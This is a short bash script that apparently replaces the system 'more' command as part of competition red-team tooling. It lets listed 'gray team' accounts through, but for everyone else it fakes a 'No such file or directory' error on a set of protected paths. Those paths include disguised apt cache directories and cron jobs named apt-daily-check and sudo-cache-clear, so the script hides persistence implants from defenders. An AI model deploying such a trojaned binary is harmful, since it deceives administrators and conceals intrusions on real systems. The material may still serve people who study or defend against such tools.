#!/bin/bash
REAL_MORE="/usr/bin/more"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_MORE "$@" ;;
esac



PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

for arg in "$@"; do
    case "$arg" in
        -*) ;;
        *)
            if _is_protected "$arg"; then
                echo "more: ${arg}: No such file or directory" >&2
                exit 1
            fi
            ;;
    esac
done

exec $REAL_MORE "$@"
